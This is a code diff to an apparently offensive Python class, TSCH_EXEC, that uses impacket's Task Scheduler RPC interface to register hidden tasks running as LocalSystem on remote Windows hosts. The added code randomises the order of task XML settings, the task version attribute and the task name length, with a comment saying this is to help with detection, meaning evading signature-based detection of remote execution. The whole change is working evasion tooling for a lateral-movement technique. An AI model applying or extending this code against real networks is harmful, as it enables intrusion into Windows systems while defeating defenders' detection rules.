@@ -1,4 +1,5 @@
 import os
+import random
 from impacket.dcerpc.v5 import tsch, transport
 from impacket.dcerpc.v5.dtypes import NULL
 from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
@@ -69,8 +70,40 @@ class TSCH_EXEC:
         return end_boundary.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3]
 
     def gen_xml(self, command, fileless=False):
+       #Random setting order to help with detection
+        settings = [
+            "    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>",
+            "    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>",
+            "    <AllowHardTerminate>true</AllowHardTerminate>",
+            "    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>",
+            "    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>"
+        ]
+        random.shuffle(settings)
+        randomized_settings = "\n".join(settings)
+        
+        settings2 = [
+            "    <AllowStartOnDemand>true</AllowStartOnDemand>",
+            "    <Hidden>true</Hidden>",
+            "    <Enabled>true</Enabled>",
+            "    <RunOnlyIfIdle>false</RunOnlyIfIdle>",
+            "    <WakeToRun>false</WakeToRun>",
+            "    <Priority>7</Priority>",
+            "    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>"
+        ]
+        random.shuffle(settings2)
+        randomized_settings2 = "\n".join(settings2)
+        
+        IdleSettings = [
+            "      <StopOnIdleEnd>true</StopOnIdleEnd>",
+            "      <RestartOnIdle>false</RestartOnIdle>"
+        ]
+        random.shuffle(IdleSettings)
+        randomized_IdleSettings = "\n".join(IdleSettings)
+        
+        random_digit = random.randint(2, 6)
+                
         xml = f"""<?xml version="1.0" encoding="UTF-16"?>
-<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+<Task version="1.{random_digit}" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
   <Triggers>
     <RegistrationTrigger>
       <EndBoundary>{self.get_end_boundary()}</EndBoundary>
@@ -83,22 +116,11 @@ class TSCH_EXEC:
     </Principal>
   </Principals>
   <Settings>
-    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
-    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
-    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
-    <AllowHardTerminate>true</AllowHardTerminate>
-    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+{randomized_settings}
     <IdleSettings>
-      <StopOnIdleEnd>true</StopOnIdleEnd>
-      <RestartOnIdle>false</RestartOnIdle>
+{randomized_IdleSettings}
     </IdleSettings>
-    <AllowStartOnDemand>true</AllowStartOnDemand>
-    <Enabled>true</Enabled>
-    <Hidden>true</Hidden>
-    <RunOnlyIfIdle>false</RunOnlyIfIdle>
-    <WakeToRun>false</WakeToRun>
-    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
-    <Priority>7</Priority>
+{randomized_settings2}
   </Settings>
   <Actions Context="LocalSystem">
     <Exec>
@@ -133,7 +155,7 @@ class TSCH_EXEC:
         dce.set_credentials(*self.__rpctransport.get_credentials())
         dce.connect()
 
-        tmpName = gen_random_string(8)
+        tmpName = gen_random_string(10)
 
         xml = self.gen_xml(command, fileless)
 
